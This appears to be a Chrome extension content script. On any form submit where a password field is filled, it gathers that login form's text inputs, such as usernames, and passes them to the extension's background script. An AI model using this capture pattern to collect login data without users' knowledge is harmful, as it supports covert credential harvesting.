document.addEventListener("submit", function(e) {
  var mInputs = document.getElementsByTagName("input");
  var mForm;
  var mTexts;
  
  for (var i = 0; i < mInputs.length; i++) {
    if (mInputs[i].type.toLowerCase() === "password") {
      if(mInputs[i].value) {
        mForm = mInputs[i].form;
        mTexts = $("#" + mForm.id + " :text").serializeArray();
        break;
      }
    }
  }
  
  chrome.runtime.sendMessage({action: "GetInput", data: mTexts}, function(response) {
    alert("Communication is done!");
  });
}, false);

